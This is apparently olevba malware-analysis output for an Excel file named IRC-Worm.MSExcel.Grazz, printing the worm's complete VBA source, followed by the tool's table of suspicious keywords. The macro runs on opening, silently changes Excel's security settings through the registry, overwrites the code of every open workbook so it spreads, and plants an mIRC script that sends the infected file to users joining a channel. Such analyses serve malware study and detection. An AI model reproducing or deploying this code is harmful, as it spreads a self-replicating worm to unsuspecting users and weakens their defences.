olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: IRC-Worm.MSExcel.Grazz-ceebf6c2ed0898484afeb4de918c4735b4d6a421
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: IRC-Worm.MSExcel.Grazz-ceebf6c2ed0898484afeb4de918c4735b4d6a421 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Feuil1.cls 
in file: IRC-Worm.MSExcel.Grazz-ceebf6c2ed0898484afeb4de918c4735b4d6a421 - OLE stream: '_VBA_PROJECT_CUR/VBA/Feuil1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Feuil2.cls 
in file: IRC-Worm.MSExcel.Grazz-ceebf6c2ed0898484afeb4de918c4735b4d6a421 - OLE stream: '_VBA_PROJECT_CUR/VBA/Feuil2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Feuil3.cls 
in file: IRC-Worm.MSExcel.Grazz-ceebf6c2ed0898484afeb4de918c4735b4d6a421 - OLE stream: '_VBA_PROJECT_CUR/VBA/Feuil3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook1.cls 
in file: IRC-Worm.MSExcel.Grazz-ceebf6c2ed0898484afeb4de918c4735b4d6a421 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Crazz
Private Sub Workbook_Open()
Call Crazz
End Sub
Function crypt(a)
For i = 1 To Len(a)
crypt = crypt & Chr(Asc(Mid(a, i, 1)) Xor 133)
Next
End Function
Private Sub Crazz()
On Error Resume Next
Set ths = ThisWorkbook.VBProject.VBComponents("ThisWorkBook").CodeModule
mycode = ths.Lines(1, 100)
ThisWorkbook.SaveCopyAs "C:\windows\Not2open.xls"
With Application
.ScreenUpdating = 0
.DisplayAlerts = 0
.EnableCancelKey = xlDisabled
.DisplayStatusBar = 0
End With
If UCase(Dir("c:\windows\crazz.bak")) <> "CRAZZ.BAK" Then
 Open "c:\windows\crazz.bak" For Output As 1
 Print #1, "REGEDIT4"
 Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
 Print #1, """Options6""=dword:00000000"
 Close 1
 Shell "regedit /s c:\windows\crazz.bak", vbHide
End If
For i = 1 To Workbooks.Count
With Workbooks(i).VBProject.VBComponents("ThisWorkBook").CodeModule
    .DeleteLines 1, .CountOfLines
    .AddFromString mycode
End With
ActiveWorkbook.SaveAs ActiveWorkbook.FullName
Next
Dim dta(4) As String
Open "c:\windows\system\crazz.ini" For Output As #1
dta(0) = "n0=[Script]"
dta(1) = "n1=ON 1:JOIN:#: { /if ( $nick == $me ) {halt}"
dta(2) = "n2= /dcc send $nick C:\windows\Not2open.xls"
dta(3) = "n3=}"
For i = 0 To 3
Print #1, dta(i)
Next
Close #1
Shell "Copy c:\windows\system\crazz.ini c:\Progra~1\mirc32\system\script.ini /Y", vbHide
Shell "Copy c:\windows\system\crazz.ini c:\Mirc32\system\script.ini /Y", vbHide
Shell "Copy c:\windows\system\crazz.ini c:\Progra~1\mirc\system\script.ini /Y", vbHide
Shell "Copy c:\windows\system\crazz.ini c:\mirc\system\script.ini /Y", vbHide
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Feuil
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Feuil
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Feuil
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

